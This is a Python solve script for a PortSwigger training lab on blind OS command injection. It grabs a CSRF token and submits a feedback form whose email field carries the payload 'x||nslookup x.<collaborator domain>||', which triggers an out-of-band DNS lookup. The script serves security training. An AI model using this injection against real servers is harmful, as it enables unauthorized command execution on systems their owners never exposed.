#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Blind OS command injection with out-of-band interaction.

Sends the OAST payload. Confirming the DNS hit requires Burp Collaborator
(or equivalent OAST endpoint) — script asks the user to provide a
Collaborator subdomain to insert into the payload.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def grab_csrf(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/feedback")
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def inject(session: requests.Session, lab: str, collab_domain: str) -> None:
    csrf = grab_csrf(session, lab)
    payload = f"x||nslookup x.{collab_domain}||"
    data = {
        "csrf": csrf,
        "name": "x",
        "email": payload,
        "subject": "x",
        "message": "x",
    }
    r = session.post(f"{lab}/feedback/submit", data=data)
    print(f"[*] Feedback submit status: {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve OS Command Injection Lab 4 (blind OAST)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument(
        "collab_domain",
        help="Burp Collaborator subdomain (e.g. abc123.oastify.com)",
    )
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print(f"[*] Injecting nslookup x.{args.collab_domain}")
    inject(s, lab, args.collab_domain)

    print(f"\n[*] Open Burp Collaborator tab → Poll now.")
    print(f"[*] Look for a DNS interaction with payload x.{args.collab_domain}")
    print(f"[*] Lab solves when the DNS hit fires.")


if __name__ == "__main__":
    main()
